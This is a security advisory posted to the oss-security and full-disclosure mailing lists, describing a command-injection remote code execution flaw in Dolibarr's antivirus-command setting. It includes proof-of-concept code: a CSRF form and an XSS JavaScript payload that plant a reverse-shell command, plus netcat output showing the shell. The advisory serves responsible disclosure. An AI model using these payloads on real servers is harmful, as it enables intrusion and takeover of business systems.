  oss-security - Dolibarr admin panel authenticated Remote Code  Execution (RCE) vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 21 May From: Sysdream Labs <labs@...dream.com> To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: Dolibarr admin panel authenticated Remote Code  Execution (RCE) vulnerability  # Dolibarr admin panel authenticated Remote Code Execution (RCE) vulnerability   ## Description  Dolibarr is an "Open Source ERP & CRM for Business" used by many companies worldwide.  It is available through [GitHub](https://github.com/Dolibarr/dolibarr) or as distribution packages (e.g .deb package).  **Threat**  By tricking a logged-in admin into clicking a malicious link, or by getting admin privileges in some other way, a remote attacker can achieve remote code execution (RCE) on the target server.  **Expectation**  User input should be filtered to avoid arbitrary OS command injection.  Arbitrary external commands should be defined in a configuration file which is not editable by an ERP user.   ## Vulnerability type  **CVE ID**:  **Access Vector**: remote  **Security Risk**: high  **Vulnerability**: CWE-78  **CVSS Base Score**: 9.0  **CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H   ## Details  The admin panel allows to define an antivirus command and parameters, which are run every time a file is uploaded and scanned.  However, it is possible for an authenticated user to specify an arbitrary command to be run instead of the antivirus scanner. The injected command would be triggered after uploading a file to scan, which effectively leads to executing arbitrary code on the server.  The command to be run is stored in the config variables `MAIN_ANTIVIRUS_COMMAND` and `MAIN_ANTIVIRUS_PARAM`, which can be set by the admin through the Web interface.  Then, when a file is uploaded by a user, the function `dol_move_uploaded_file()` (defined in `files.lib.php`) is called:  ```php function dol_move_uploaded_file($src_file, $dest_file, $allowoverwrite, $disablevirusscan=0, $uploaderrorcode=0, $nohook=0, $varfiles='addedfile') {     ... snip ...      // If we need to make a virus scan     if (empty($disablevirusscan) && file_exists($src_file))     {         $checkvirusarray=dolCheckVirus($src_file);         if (count($checkvirusarray))         {            dol_syslog('Files.lib::dol_move_uploaded_file File "'.$src_file.'" (target name "'.$dest_file.'") KO with antivirus: result='.$result.' errors='.join(',',$checkvirusarray), LOG_WARNING);            return 'ErrorFileIsInfectedWithAVirus: '.join(',',$checkvirusarray);         }     }      ... snip ...      return 1;   // Success } ```  Which calls `dolCheckVirus()`:  ```php function dolCheckVirus($src_file) {     global $conf;      if (! empty($conf->global->MAIN_ANTIVIRUS_COMMAND))     {         if (! class_exists('AntiVir')) {             require_once DOL_DOCUMENT_ROOT.'/core/class/antivir.class.php';         }         $antivir=new AntiVir($db);         $result = $antivir->dol_avscan_file($src_file);         if ($result < 0)    // If virus or error, we stop here         {             $reterrors=$antivir->errors;             return $reterrors;         }     }     return array(); } ```  Which in turn calls `dol_avscan_file()` (defined in `antivir.class.php`), where the return value of `getCliCommand()` is passed to the `exec()` PHP function:  ```php function dol_avscan_file($file)     {         global $conf;          $return = 0;          if (preg_match('/\.virus$/i', $file))         {             $this->errors='File has an extension saying file is a virus';             return -97;         }          $fullcommand=$this->getCliCommand($file);         //$fullcommand='"c:\Program Files (x86)\ClamWin\bin\clamscan.exe" --database="C:\Program Files (x86)\ClamWin\lib" "c:\temp\aaa.txt"';         $fullcommand.=' 2>&1';      // This is to get error output          $output=array();         $return_var=0;         $safemode=ini_get("safe_mode");         // Create a clean fullcommand         dol_syslog("AntiVir::dol_avscan_file Run command=".$fullcommand." with safe_mode ".($safemode?"on":"off"));         // Run CLI command. If run of Windows, you can get return with echo %ERRORLEVEL%         $lastline=exec($fullcommand, $output, $return_var);          //print "x".$lastline." - ".join(',',$output)." - ".$return_var."y";exit;          ... snip ...          // If return code = 0         return 1;     } ```  The `getCliCommand()` routine uses the `MAIN_ANTIVIRUS_COMMAND` to format the antivirus command to be executed. Even though `escapeshellarg()` is used, it is possible for this variable to hold arbitrary shell commands which will be concatenated and executed:  ```php function getCliCommand($file)     {         global $conf;          $maxreclevel = 5 ;          // maximal recursion level         $maxfiles =           // maximal number of files to be scanned within archive         $maxratio =            // maximal compression ratio         $bz2archivememlim = 0;      // limit memory usage for bzip2 (0/1)         $maxfilesize =    // archived files larger than this value (in bytes) will not be scanned          $command=$conf->global->MAIN_ANTIVIRUS_COMMAND;         $param=$conf->global->MAIN_ANTIVIRUS_PARAM;          $param=preg_replace('/%maxreclevel/',$maxreclevel,$param);         $param=preg_replace('/%maxfiles/',$maxfiles,$param);         $param=preg_replace('/%maxratio/',$maxratio,$param);         $param=preg_replace('/%bz2archivememlim/',$bz2archivememlim,$param);         $param=preg_replace('/%maxfilesize/',$maxfilesize,$param);         $param=preg_replace('/%file/',trim($file),$param);          if (! preg_match('/%file/',$conf->global->MAIN_ANTIVIRUS_PARAM))             $param=$param." ".escapeshellarg(trim($file));          if (preg_match("/\s/",$command)) $command=escapeshellarg($command); // Use quotes on command. Using escapeshellcmd fails.          $ret=$command.' '.$param;         //$ret=$command.' '.$param.' 2>&1';         //print "xx".$ret."xx";exit;          return $ret;     } ```  ## Proof of Concept 1 : Exploiting CSRF control bypass  Dolibarr generates an anti-CSRF token which is not checked by default. Another control on the `Referer` header is also perfomed (in `filefunc.inc.php`):  ``` // Security: CSRF protection // This test check if referrer ($_SERVER['HTTP_REFERER']) is same web site than Dolibarr ($_SERVER['HTTP_HOST']) // when we post forms (we allow GET to allow direct link to access a particular page). // Note about $_SERVER[HTTP_HOST/SERVER_NAME]: if (! defined('NOCSRFCHECK') && empty($dolibarr_nocsrfcheck)) {     if (! empty($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET' && ! empty($_SERVER['HTTP_HOST'])     && (empty($_SERVER['HTTP_REFERER']) || ! preg_match('/'.preg_quote($_SERVER['HTTP_HOST'],'/').'/i', $_SERVER['HTTP_REFERER'])))     {         //print 'NOCSRFCHECK='.defined('NOCSRFCHECK').' REQUEST_METHOD='.$_SERVER['REQUEST_METHOD'].' HTTP_POST='.$_SERVER['HTTP_HOST'].' HTTP_REFERER='.$_SERVER['HTTP_REFERER'];         print "Access refused by CSRF protection in main.inc.php. Referer of form is outside server that serve the POST.\n";         print "If you access your server behind a proxy using url rewriting, you might check that all HTTP header is propagated (or add the line \$dolibarr_nocsrfcheck=1 into your conf.php file).\n";         die;     }     // Another test is done later on token if option MAIN_SECURITY_CSRF_WITH_TOKEN is on. } if (empty($do ```  However, this controlled can be bypassed since the check only ensures the header contains the server's domain name in its URL. If the victim application is at `http://dolibarr.lab`, requesting from `http://attack.lab/dolibar.lab/exploit.html` would therefore bypass the control.  By tricking a logged-in admin into clicking our exploit link, we can therefore make him change the antivirus command to our exploit payload silently.  Here is a sample exploit page which will change the antivirus scan command to a reverse shell payload:  ```html <html> <body>    <form method="POST" id="form1" target="iframe1">     <input type="hidden" name="action" value="updateform" />     <input type="hidden" name="MAIN_UPLOAD_DOC" />     <input type="hidden" name="MAIN_UMASK" />     <input type="hidden" name="MAIN_ANTIVIRUS_COMMAND" value="test" />     <input type="hidden" name="MAIN_ANTIVIRUS_PARAM" value=";/bin/bash -c 0>&1 2>&1 &'" />     <input type="hidden" name="button" value="Modify" />   </form>   <iframe style="display: hidden" height="0" width="0" frameborder="0" name="iframe1"></iframe>    <script>     document.forms[0].submit();   </script> </body> </html> ```  The file is hosted in a subdirectory so the `Referer` header will look similar to the following when the admin visits our page:  ``` POST /dolibarr/admin/security_file.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux Accept: Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: Cookie: DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length:  ```  Hence the request is accepted by the Dolibarr application and the antivirus command is replaced with our payload. Next time a file is uploaded, a reverse shell is opened on our attacking machine:  ``` POST /dolibarr/admin/security_file.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux Accept: Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: Cookie: DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; Content-Length:  Content-Disposition: form-data; name="section_dir"   Content-Disposition: form-data; name="section_id"  0 Content-Disposition: form-data; name="token"  Content-Disposition: form-data; name="max_file_size"  Content-Disposition: form-data; name="userfile[]"; filename="test.log" Content-Type: text/x-log  foobarr  Content-Disposition: form-data; name="sendit"  Send file ```  ``` $ nc -lvp listening on [any] ... inverse host lookup failed: Unknown host connect to from (UNKNOWN) id uid=33(www-data) gid=33(www-data) groups=33(www-data) ```   ## Proof of Concept 2 : Exploiting XSS vulnerability  By exploiting the XSS vulnerability on the application, it is possible to both set the antivirus command and upload a dummy file so as to trigger our payload immediately.  Here is an exploit code that will update the antivirus command to a reverse shell payload and trigger it with a file upload.  ```php function stage1() {     var xhr = new XMLHttpRequest();     xhr.open("POST", true);     xhr.setRequestHeader("Accept",     xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");     xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");     xhr.withCredentials = true;     var body =     var aBody = new Uint8Array(body.length);     for (var i = 0; i < aBody.length; i++)       aBody[i] = body.charCodeAt(i);     xhr.send(new Blob([aBody])); }  function stage2() {     var xhr = new XMLHttpRequest();     xhr.open("POST", true);     xhr.setRequestHeader("Content-Type", "multipart\/form-data;     xhr.withCredentials = true;     var body = +     "Content-Disposition: form-data; name=\"userfile[]\"; filename=\"test.txt\"\r\n" +     "Content-Type: text/plain\r\n" +     "\r\n" +     "foobar\r\n" +     +     "Content-Disposition: form-data; name=\"sendit\"\r\n" +     "\r\n" +     "Send file\r\n" +         var aBody = new Uint8Array(body.length);     for (var i = 0; i < aBody.length; i++)     aBody[i] = body.charCodeAt(i);     xhr.send(new Blob([aBody])); }  stage1(); setTimeout(stage2, ```  To deliver it, we will hex encode it and paste it into our vulnerable XSS link:  **hex decoder function**  ```php function hex2a(hex) {var str = "";for(var i = 0; i < hex.length;i+=2){str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));}return str;} ```  **urlencoded twice**  ``` ```  ``` $ cat xssrce.js|xxd -ps|tr -d '\n'  ```   **Javascript payload**  ```javascript ```  **Resulting exploit link**  ``` ```  By tricking an admin into visiting our link, we get a reverse shell on the Web server:  ``` $ nc -lvp listening on [any] ... inverse host lookup failed: Unknown host connect to from (UNKNOWN) id uid=33(www-data) gid=33(www-data) groups=33(www-data) ```  ## Affected versions  * Version (last stable version as of March - previous versions are probably also vulnerable but not tested  ## Solution  Update to ([changelog](https://raw.githubusercontent.com/Dolibarr/dolibarr/develop/ChangeLog))  ## Timeline (dd/mm/yyyy)  * : Initial discovery * : Contact with the editor * : Editor acknowledges the vulnerability * : Editor announces fixes in version * : Vulnerability disclosure  ## Credits  * Kevin LOCATI (k dot locati at sysdream dot com)     Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      